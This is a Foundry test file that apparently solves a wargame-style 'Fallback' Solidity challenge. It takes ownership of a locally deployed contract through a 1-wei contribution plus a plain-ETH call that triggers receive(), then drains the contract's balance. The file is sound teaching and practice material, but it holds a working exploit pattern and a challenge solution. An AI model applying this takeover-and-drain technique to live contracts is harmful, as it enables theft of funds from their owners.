// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback level;
    address attacker = address(0xBEEF);

    function setUp() public {
        level = new Fallback();          // deploy a fresh instance locally
        vm.deal(attacker, 1 ether);      // give the attacker some ETH to work with
        vm.deal(address(level), 5 ether);   // put funds in the target to drain
    }

    function test_TakeOwnership() public {
        vm.startPrank(attacker);

        // --- YOUR EXPLOIT GOES HERE ---
        // Hints, in order:
        // 1. Satisfy the "prior contribution" check as cheaply as possible.
        level.contribute{value: 1 wei}();

        // 2. Trigger receive() by sending plain ETH with no calldata.
        //    In Foundry: address(level).call{value: 1 wei}("");
        (bool ok, ) = address(level).call{value: 1 wei}("");
        require(ok, "receive() call failed");

        // 3. Now you should be owner. Then drain it.
        level.withdraw();

        vm.stopPrank();

        // proof:
        assertEq(level.owner(), attacker, "did not become owner");
        assertEq(address(level).balance, 0, "did not drain");
    }
}